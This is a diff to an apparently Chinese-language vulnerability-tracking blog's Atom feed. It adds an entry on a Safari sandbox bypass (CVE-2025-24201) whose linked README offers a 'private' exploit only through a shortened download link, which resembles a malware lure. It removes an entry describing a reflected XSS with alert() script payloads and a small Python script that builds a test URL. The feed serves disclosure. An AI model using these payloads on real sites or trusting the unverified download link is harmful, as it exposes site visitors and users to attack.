@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-14T13:15:47.087Z</updated>
+  <updated>2025-06-14T13:45:14.495Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Apple Safari Web Content Sandbox Bypass Vulnerability</title>
+    <link href="http://example.com/2025/06/14/github_1739276916/"/>
+    <id>http://example.com/2025/06/14/github_1739276916/</id>
+    <published>2025-06-14T13:45:14.495Z</published>
+    <updated>2025-06-14T13:45:14.495Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apple Safari Web Content Sandbox Bypass Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-24201</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Apple Safari Web Content Sandbox Bypass Vulnerability是一个严重的权限绕过漏洞，允许攻击者通过越界写入绕过Safari的Web内容沙箱。该漏洞的CVE ID为CVE-2025-24201，影响程度为严重，CVSS评分为8.8。目前尚无官方补丁可用。</p><p><strong>产品厂商：</strong> Apple</p><p><strong>产品名称：</strong> Safari</p><p><strong>来源：</strong> <a href="https://github.com/AvonBorn/CVE-2025-24201-Exploit">https://github.com/AvonBorn/CVE-2025-24201-Exploit</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-24201-Exploit"><a href="#CVE-2025-24201-Exploit" class="headerlink" title="CVE-2025-24201-Exploit"></a>CVE-2025-24201-Exploit</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Out-of-Bounds Write Vulnerability in Apple Safari Web Content Sandbox Bypass</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit:"></a>Exploit:</h3><h4 id="Download-here"><a href="#Download-here" class="headerlink" title="Download here"></a><a href="https://tinyurl.com/mw54dudy">Download here</a></h4><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><ul><li><strong>CVE ID</strong>: CVE-2025-24201  <img align="right" alt="Enderman" width="180" src="https://github.com/AvonBorn/Profile/blob/9ff2d6ec8dbc3a47a18a7e121330828838a9cf38/enderman.gif" /></li><li><strong>Published</strong>: 03&#x2F;11&#x2F;2025</li><li><strong>Impact</strong>: Critical</li><li><strong>Exploit Availability</strong>: Not public, only private.</li><li><strong>CVSS</strong>: 8.8</li><li><strong>Patch Available:  (No official patch yet)</strong></li></ul><h3 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h3><ul><li><strong>For inquiries, please contact:<a href="mailto:&#97;&#x76;&#111;&#x6e;&#98;&#97;&#115;&#x65;&#x32;&#49;&#x33;&#x40;&#111;&#x75;&#x74;&#108;&#x6f;&#x6f;&#x6b;&#46;&#99;&#x6f;&#x6d;">avonbase213@outlook.com</a></strong></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apple Safari Web Content Sandbox Bypass</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
   
   <entry>
     <title>D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection</title>
@@ -517,32 +543,6 @@
     <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
     
     <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Online Appointment Booking System Reflected XSS Vulnerability</title>
-    <link href="http://example.com/2025/06/14/github_3185488171/"/>
-    <id>http://example.com/2025/06/14/github_3185488171/</id>
-    <published>2025-06-14T07:45:20.893Z</published>
-    <updated>2025-06-14T07:45:20.890Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Online Appointment Booking System Reflected XSS Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-46181</li></ul><p><strong>漏洞类型：</strong> 跨站可执行脚本</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 在线预约预订系统(v1.0)中存在反射型跨站脚本(XSS)漏洞，特别是在处理预约确认的页面中。一个GET参数未能正确清理输入，使得可以在受害者的浏览器中注入并执行JavaScript代码。</p><p><strong>产品名称：</strong> Online Appointment Booking System</p><p><strong>影响版本：</strong> v1.0</p><p><strong>来源：</strong> <a href="https://github.com/shemkumar/CVE-2025-46181-XSS">https://github.com/shemkumar/CVE-2025-46181-XSS</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>DISCLAIMER.md</li><li>LICENSE</li><li>README.md</li><li>poc.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-46181-Reflected-XSS-in-an-Online-Appointment-Booking-System"><a href="#CVE-2025-46181-Reflected-XSS-in-an-Online-Appointment-Booking-System" class="headerlink" title="CVE-2025-46181 - Reflected XSS in an Online Appointment Booking System"></a>CVE-2025-46181 - Reflected XSS in an Online Appointment Booking System</h2><p><strong>CVE-ID</strong>: CVE-2025-46181<br><strong>Discovered by</strong>: Shemkumar P (<a href="https://shemkumar.github.io/">shemkumar.github.io</a>)<br><strong>Vulnerability Type</strong>: Reflected Cross-Site Scripting (XSS)<br><strong>Severity</strong>: Medium<br><strong>Status</strong>: Disclosed, CVE Assigned by MITRE</p><hr><h3 id="✨-Description"><a href="#✨-Description" class="headerlink" title="✨ Description"></a>✨ Description</h3><p>A <strong>Reflected Cross-Site Scripting (XSS)</strong> vulnerability exists in a public online appointment booking system (v1.0), specifically in the page that handles appointment confirmation. A GET parameter fails to sanitize input properly, enabling JavaScript injection and code execution in the victim’s browser.</p><hr><h3 id="📍-Vulnerable-Parameter"><a href="#📍-Vulnerable-Parameter" class="headerlink" title="📍 Vulnerable Parameter"></a>📍 Vulnerable Parameter</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /confirmapp.php?<span class="hljs-attribute">slotdt</span>=&lt;payload&gt;<br></code></pre></td></tr></table></figure><p><strong>Example Payload (Encoded)</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;XSS&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="💥-Proof-of-Concept-PoC"><a href="#💥-Proof-of-Concept-PoC" class="headerlink" title="💥 Proof of Concept (PoC)"></a>💥 Proof of Concept (PoC)</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;You have been hijacked&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>🚫 <strong>Live link redacted for ethical reasons.</strong> This vulnerability was tested in a controlled environment.</p><hr><h3 id="⚙️-Python-PoC-Script"><a href="#⚙️-Python-PoC-Script" class="headerlink" title="⚙️ Python PoC Script"></a>⚙️ Python PoC Script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>base_url = <span class="hljs-string">&quot;https://[REDACTED]/confirmapp.php&quot;</span><br>payload = <span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;XSS triggered&quot;)&lt;/script&gt;&#x27;</span><br><br>params = &#123;<br>    <span class="hljs-string">&#x27;fullname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>    <span class="hljs-string">&#x27;mobile&#x27;</span>: <span class="hljs-string">&#x27;9999999999&#x27;</span>,<br>    <span class="hljs-string">&#x27;emailid&#x27;</span>: <span class="hljs-string">&#x27;test@example.com&#x27;</span>,<br>    <span class="hljs-string">&#x27;slotdt&#x27;</span>: payload,<br>    <span class="hljs-string">&#x27;slottime&#x27;</span>: <span class="hljs-string">&#x27;11:00:00&#x27;</span>,<br>    <span class="hljs-string">&#x27;doctorid&#x27;</span>: <span class="hljs-string">&#x27;2&#x27;</span><br>&#125;<br><br>encoded = <span class="hljs-string">&#x27;&amp;&#x27;</span>.join(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;k&#125;</span>=<span class="hljs-subst">&#123;quote(<span class="hljs-built_in">str</span>(v))&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> params.items())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Test URL (use only in authorized test environments):&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base_url&#125;</span>?<span class="hljs-subst">&#123;encoded&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><hr><h3 id="🛡️-Impact"><a href="#🛡️-Impact" class="headerlink" title="🛡️ Impact"></a>🛡️ Impact</h3><ul><li>Arbitrary JavaScript execution</li><li>Potential session hijacking</li><li>Clickjacking or phishing redirection</li><li>Targeted attacks through crafted links</li></ul><hr><h3 id="🧪-Remediation"><a href="#🧪-Remediation" class="headerlink" title="🧪 Remediation"></a>🧪 Remediation</h3><p>The application should:</p><ul><li>Escape user inputs using <code>htmlspecialchars()</code> in PHP</li><li>Use a Content Security Policy (CSP)</li><li>Sanitize user data at both client and server sides</li></ul><hr><h3 id="📜-Timeline"><a href="#📜-Timeline" class="headerlink" title="📜 Timeline"></a>📜 Timeline</h3><ul><li><strong>Discovered</strong>: May 2025  </li><li><strong>CVE Assigned by MITRE</strong>: June 2025  </li><li><strong>Public Release</strong>: June 2025</li></ul><hr><h3 id="🧑‍💻-Author"><a href="#🧑‍💻-Author" class="headerlink" title="🧑‍💻 Author"></a>🧑‍💻 Author</h3><p><strong>Shemkumar P</strong><br>🕸️ <a href="https://shemkumar.github.io/">shemkumar.github.io</a><br>🔐 Cybersecurity Researcher | CTF Enthusiast | CVE Reporter</p><hr><blockquote><p>⚠️ This publication is for educational and defensive use only. Testing or exploiting vulnerabilities on systems you don’t own or have explicit permission for is illegal and unethical.</p></blockquote>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Online Appointment Booking System Refle</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-    <category term="跨站可执行脚本" scheme="http://example.com/tags/%E8%B7%A8%E7%AB%99%E5%8F%AF%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC/"/>
     
   </entry>
   
